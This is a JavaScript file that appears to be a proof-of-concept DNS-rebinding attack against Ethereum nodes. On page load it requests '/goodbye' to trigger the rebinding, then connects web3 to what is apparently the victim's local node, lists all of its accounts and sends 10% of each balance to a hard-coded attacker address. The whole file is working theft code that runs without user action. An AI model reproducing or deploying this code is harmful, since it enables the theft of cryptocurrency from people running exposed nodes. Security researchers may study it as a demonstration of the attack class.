var BigNumber    = require('big-number');
var DEST_ADDRESS = "0x3ffc132784c89a7edda93e3ad3d669ab6c013cfd";
var web3         = null;
var logHtml      = "";


function getHref() {
  var parts = window.location.href.split("/");
  return parts[0] + "//" + parts[2];
}

function log(msg) {
  var logDiv        = document.getElementById("logDiv");
      logHtml      += ("<br/>" + msg);
  logDiv.innerHTML  = logHtml;
}

function initW3() {
  log("initializing w3...");
  var Web3 = require('web3');
      web3 = new Web3();

  web3.setProvider(new web3.providers.HttpProvider(getHref()));
}

function takeEthFrom(address) {
  log("getting balance for account " + address + "...");
  var balanceWei = web3.eth.getBalance(address);
  var takeWei    = balanceWei.div(10);
  var txn        = {
    from  : address,
    to    : DEST_ADDRESS,
    value : takeWei
  };

  log("sending transaction -> " + JSON.stringify(txn, null, 2));
  web3.eth.sendTransaction(txn, function(err, result) {
    if (!err) {
      log("transaction succeeded with result -> " + result);
    } else {
      log("transaction failed with error -> " + err);
    }
  });
}

function takeEth() {
  log("getting account list...");
  var accounts = web3.eth.accounts;
  for (var i = 0; i < accounts.length; i++) {
    takeEthFrom(accounts[i]);
  }
}

function sayGoodbye() {
  log("rebinding dns...");
  $.ajax({
    type: 'GET',
    url: '/goodbye',
    success: function(data, status, xhr) {
      initW3();
      takeEth();
    },
    error: function (data, status, error) {
      log("xhr /goodbye failed, status -> " + status + " error -> " + error);
    }
  });
}

sayGoodbye();
